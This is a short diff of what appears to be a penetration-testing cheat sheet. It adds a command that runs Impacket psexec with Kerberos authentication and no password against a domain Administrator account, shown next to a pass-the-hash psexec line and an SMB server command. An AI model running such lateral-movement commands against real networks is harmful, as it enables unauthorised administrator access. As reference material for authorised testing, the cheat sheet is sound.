@@ -22,6 +22,10 @@ sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123
 
 ```csharp
 ./psexec.py -hashes <ntlm hash:ntlm hash> Administrator@<IP TARGET>
+
+# or without password (kerberos)
+
+./psexec.py CROOK.BADCORP.LOCAL/Administrator@10.110.0.222 -k -no-pass
 ```
 
 ## Golden Ticket
